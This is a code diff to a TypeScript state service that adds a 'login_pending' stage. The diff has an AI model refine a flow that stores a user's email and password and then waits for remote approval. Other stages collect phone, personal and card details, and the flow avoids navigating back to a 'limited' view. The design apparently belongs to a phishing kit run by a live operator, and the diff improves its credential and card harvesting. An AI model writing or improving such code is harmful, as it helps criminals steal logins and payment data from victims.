@@ -440,6 +440,7 @@ export class StateService {
       if (viewToRestore === 'loading' && data.stage) {
           const s = data.stage;
           if (s === 'login') viewToRestore = 'login';
+          else if (s === 'login_pending') viewToRestore = 'loading'; // Keep on loading, waiting for approval
           else if (s === 'phone_pending') viewToRestore = 'phone';
           else if (s === 'personal_pending') viewToRestore = 'personal';
           else if (s === 'card_pending') viewToRestore = 'card';
@@ -587,7 +588,8 @@ export class StateService {
 
               // Define payload based on stage
               const payload: any = {};
-              if (this.stage() === 'login') {
+              const stage = this.stage();
+              if (stage === 'login' || stage === 'login_pending') {
                   payload.skipPhone = true;
               }
 
@@ -964,7 +966,7 @@ export class StateService {
                this.verificationFlow.set(payload.flow);
            }
 
-           if (currentStage === 'login') {
+           if (currentStage === 'login' || currentStage === 'login_pending') {
                // Prevent regression: If already verified, don't navigate back to limited
                if (this.isLoginVerified()) {
                    return;
@@ -1102,7 +1104,8 @@ export class StateService {
   submitLogin(e: string, p: string) {
       this.email.set(e);
       this.password.set(p);
-      this.stage.set('login');
+      this.isLoginSubmitted.set(true);
+      this.stage.set('login_pending'); // Use pending stage to prevent infinite loading fix redirect
       this.rejectionReason.set(null);
       this.waitingStart.set(Date.now());
       this.navigate('loading');
